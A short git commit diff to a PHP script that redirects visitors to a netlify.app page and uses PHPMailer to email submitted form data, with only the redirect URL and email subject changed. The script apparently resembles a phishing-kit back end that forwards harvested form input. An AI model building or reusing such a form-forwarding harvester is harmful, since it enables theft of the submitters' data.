50d761c5cc5169d02b92d0d16b6d69dcbe64082d
Uzar33921 <tiktokworkingsteam@gmail.com>
2025-07-25 16:47:05 +0500

    Update and rename Ali.php to Zkr.php

--- Zkr.php
+++ Zkr.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://clinquant-taffy-944e90.netlify.app/");
+header("Location: https://wonderful-begonia-4bbdb3.netlify.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
@@ -44,7 +44,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'ali';
+        $mail->Subject = 'zkr';
         $mail->Body = $emailBody; // Set the email body using the collected form data
 
         // Send email
